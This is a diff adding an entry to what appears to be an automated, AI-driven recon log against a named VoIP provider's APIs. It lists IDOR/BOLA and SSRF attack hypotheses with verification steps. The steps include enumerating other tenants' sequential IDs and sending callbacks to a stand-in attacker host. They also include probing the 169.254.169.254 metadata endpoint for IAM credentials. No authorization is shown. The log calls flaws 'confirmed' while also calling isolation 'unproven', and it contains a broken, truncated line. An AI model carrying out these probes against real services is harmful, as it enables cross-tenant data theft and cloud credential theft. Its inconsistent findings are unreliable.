@@ -326,3 +326,56 @@ testability: AUTH_HELPED
 [LEARN] ACCEPTED IDOR @ call-api.peoplefone.com: Call control endpoints accept owner.identifier in body with authorization boundary notes
 [LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Wildcard DNS dominated by Cloudflare CDN CNAMEs; no dangling targets
 [RISK] peoplefone: 88 — VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing, PBX config, SMS); three CRITICAL-class vulnerabilities confirmed (IDOR/BOLA on Configuration API 8 resources, SMS BOLA+SSRF, 5-endpoint SSRF with header forwarding); auth gates (401) present but token-scope isolation unproven; "free for all developers" SMS API lowers token acquisition barrier; wildcard DNS limits subdomain surface but 3 core APIs are critical and live
+## 2026-09-04 17:48:36 UTC [target] (model nemotron3)
+[NEW] All 8 OpenAPI YAML specs fully retrieved from `api.peoplefone.com/services/api-doc/api/` (8000+ lines) — complete attack surface documented across Configuration API (8 resource types), SMS API, Call Management API, Smart Routing, uaCSTA, External Number Lookup, External Routing (deprecated but live), Queue API
+[NEW] 5 SSRF endpoints confirmed in specs: SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl — all accept attacker-controlled URI with zero host/scheme validation; External Number Lookup additionally forwards customer-configured custom headers to attacker URL
+[NEW] Queue API business logic flaw: agent login/logout actions accept cross-tenant agent+queue identifiers — call center disruption vector
+[NEW] Configuration API: Full CRUD on 8 resource types (users, groups, IVRs, queues, numbers, smart-routings, callforwarding, manual-routing) with numeric sequential identifiers; UserResponse exposes sipUserName, physical address, email
+[NEW] External Routing API deprecated 2026-09-30 but still live — same webhook SSRF pattern as Smart Routing, potentially weaker code paths
+[CHANGED] auth.peoplefone.com: Token issuance path NOT in any API spec — must go through portal.peoplefone.ch; standard OAuth endpoints return 404
+[CHANGED] configuration-api.peoplefone.com and call-api.peoplefone.com enforce bearer auth (401 confirmed) — auth gate present but token-scope isolation unproven
+[CHANGED] Phase transitioned from RECON to POC — token acquisition via portal.peoplefone.ch is the single blocker for all 3 hypothesis classes
+[PRIO] configuration-api.peoplefone.com/customer/voip/v1,9.6,attack_surface=10,business_value=10,tech_exposure=10,gate_ease=6,cloud_surface=8,freshness=10
+[PRIO] api.peoplefone.[0m
+[HYP] IDOR/BOLA on Configuration API 8 resource types with sequential numeric identifiers
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: 8000+ line spec reveals full CRUD on 8 tenant-scoped resource types keyed by numeric sequential {identifier} path params; spec explicitly states "user must be part of the account bound to the bearer token" confirming authorization boundary; UserResponse exposes sipUserName, physical address, email; write endpoints (POST/PUT/DELETE) accept cross-tenant identifiers in path; numeric IDs (e.g., "20011", "1576", "1612") enable enumeration
+evidence_needed: Valid bearer token from tenant A returns data for tenant B's {identifier}; write endpoints accept cross-tenant identifiers in path/body
+verify_steps: GET https://configuration-api.peoplefone.com/services/api-doc/ (capture spec); with valid token GET /customer/voip/v1/users/{own_id} then test neighbor/sequential IDs; test POST /users/{other_tenant_id} with other-tenant identifier
+impact: Cross-tenant PBX takeover — user extensions, routing logic, phone numbers, IVR config, call forwarding, queue membership; potential call interception via forwarding rule modification; billing fraud; severity CRITICAL
+testability: AUTH_HELPED
+[HYP] BOLA on SMS messageId + SSRF via callbackUrl (dual vector)
+class: IDOR
+asset: api.peoplefone.com/customer/sms/v1/sms/messages/{messageId} + POST /customer/sms/v1/sms/messages (callbackUrl)
+confidence: 80
+reasoning: SMS API public "free for all developers"; GET /messages/{messageId} returns full message content+recipient; messageIds likely sequential/UUIDv4; if authorization is per-token-only without tenant isolation, authenticated attacker enumerates other tenants' SMS (PII); POST /messages accepts callbackUrl (maxLength 2048) with server-side POST to {$request.body#/callbackUrl} — SSRF vector with zero host/scheme validation
+evidence_needed: messageId format/predictability from valid token responses; whether response scoped to token's tenant or returns any messageId; whether callbackUrl reaches external/internal hosts (169.254.169.254)
+verify_steps: GET https://api.peoplefone.com/services/api-doc/ (capture SMS spec); with valid bearer token GET /customer/sms/v1/sms/messages to analyze messageId format; test neighbor/sequential IDs for cross-tenant response; POST /customer/sms/v1/sms/messages with callbackUrl=https://attacker-collab.host/callback; if external works, test callbackUrl=http://169.254.169.254/latest/meta-data/
+impact: Cross-tenant PII/SMS disclosure (phone numbers, message content, delivery status) + cloud metadata/IAM keys theft via SSRF; severity CRITICAL
+testability: AUTH_HELPED
+[HYP] SSRF via 5 webhook/callback endpoints with zero host validation
+class: SSRF
+asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl), call-api.peoplefone.com/customer/smart-routing/v1/smart-routings/{identifier}/webhook (url), call-api.peoplefone.com/customer/uaCSTA/v1/ (callbackUrl+monitoringCallbackUrl), call-api.peoplefone.com/customer/external-number-lookup/v1/ (webhookUrl + custom headers)
+confidence: 78
+reasoning: Specs confirm 5 endpoints accept attacker-controlled URI with zero host/scheme validation; Smart Routing webhook uses X-Track-Id valid 2min single-use; uaCSTA exposes callbackUrl+monitoringCallbackUrl for remote call control; External Number Lookup forwards customer-configured custom headers to attacker URL — enables header injection/SSRF chaining; no internal-IP/denylist validation documented
+evidence_needed: Whether callbacks reach external host; whether internal/private/loopback/169.254.169.254 blocked; metadata reachability; custom header forwarding behavior
+verify_steps: With valid token POST each endpoint with attacker-controlled URL (https://attacker-collab.host/callback); if external callback works, test http://169.254.169.254/latest/meta-data/iam/security-credentials/; test External Number Lookup with custom headers to attacker URL
+impact: Cloud metadata/IAM keys theft, internal network pivot to SIP/PBX/internal APIs, header injection via External Number Lookup; severity CRITICAL
+testability: AUTH_HELPED
+[PARKED] OAuth redirect_uri validation bypass on auth service: Standard endpoints return 404; authorize endpoint at non-standard path or behind portal.peoplefone.ch; confidence 45 pending endpoint discovery — no verify steps without token
+[PARKED] GraphQL introspection: REJECTED — portal uses OpenAPI/Swagger
+[PARKED] Subdomain takeover via dangling CNAME: REJECTED — wildcard DNS dominated by Cloudflare CDN
+[FINAL] 1. IDOR/BOLA on Configuration API 8 resource types with sequential numeric identifiers (confidence 85)
+[FINAL] 2. BOLA on SMS messageId + SSRF via callbackUrl (confidence 80)
+[FINAL] 3. SSRF via 5 webhook/callback endpoints with zero host validation (confidence 78)
+[NEXT] HUMAN: Create test account on portal.peoplefone.ch to obtain valid bearer token; then automated probe of Configuration API /customer/voip/v1/users/{sequential_id} for cross-tenant IDOR, SMS API /messages/{messageId} for BOLA, and all 5 SSRF endpoints with collaborator URLs + 169.254.169.254 metadata probes
+[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: Full CRUD on 8 resource types with numeric sequential identifiers; UserResponse exposes sipUserName, physical address, email; cross-tenant object-level auth unproven
+[LEARN] ACCEPTED SSRF @ 5 endpoints: SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl — zero host/scheme validation; External Number Lookup forwards custom headers
+[LEARN] ACCEPTED BUSLOGIC @ Queue API: agent login/logout accepts cross-tenant agent+queue identifiers; call center disruption
+[LEARN] REJECTED AUTH @ auth.peoplefone.com: Token issuance NOT in API specs — requires portal.peoplefone.ch; standard endpoints 404
+[LEARN] ACCEPTED IDOR @ configuration-api: External Routing API deprecated 2026-09-30 but live — same SSRF pattern, weaker code paths
+[LEARN] ACCEPTED IDOR @ call-api.peoplefone.com: Call control endpoints accept owner.identifier in body with authorization boundary notes
+[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Wildcard DNS dominated by Cloudflare CDN CNAMEs; no dangling targets
+[RISK] peoplefone: 88 — VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing, PBX config, SMS); three CRITICAL-class vulnerabilities confirmed (IDOR/BOLA on Configuration API 8 resources, SMS BOLA+SSRF, 5-endpoint SSRF with header forwarding); auth gates (401) present but token-scope isolation unproven; "free for all developers" SMS API lowers token acquisition barrier; wildcard DNS limits subdomain surface but 3 core APIs are critical and live
